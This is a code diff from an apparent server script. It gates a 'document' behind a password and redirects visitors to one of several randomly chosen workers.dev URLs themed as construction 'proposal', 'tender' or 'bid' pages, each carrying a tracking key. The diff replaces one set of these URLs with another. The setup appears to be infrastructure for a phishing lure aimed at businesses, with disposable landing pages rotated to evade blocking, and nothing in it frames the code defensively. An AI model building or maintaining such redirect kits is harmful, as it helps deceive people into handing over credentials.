@@ -13,10 +13,10 @@ const CORRECT_CODE = process.env.DOCUMENT_PASSWORD || "2027219";
 
 // Add as many URLs as you want here. The script will pick one at random.
 const REDIRECT_URLS = [
-  "https://proposal-108420-9eb-998ca1.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
-  "https://proposal-108420-82e94a.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
-  "https://proposal-108420-82e-21938b.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1",
-  "https://proposal-108420-219-9ebfe7.millworks-construction.workers.dev/?k=4G2g2qr1lOLji2ay6PhvB7M1"
+  "https://tender-proposal-82e329.metrolinkscorpgc-2089.workers.dev/?k=InUnPNcqMEFoRP7B5v-A4dd_",
+  "https://tender-proposal-82e329-b65898.metrolinkscorpgc-2089.workers.dev/?k=InUnPNcqMEFoRP7B5v-A4dd_",
+  "https://bid-proposal-db6676.metrolinkscorpgc-2089.workers.dev/?k=InUnPNcqMEFoRP7B5v-A4dd_",
+  "https://bid-proposal-db6676-72772b.metrolinkscorpgc-2089.workers.dev/?k=InUnPNcqMEFoRP7B5v-A4dd_"
 ];
 
 app.post('/api/unlock', async (req, res) => {
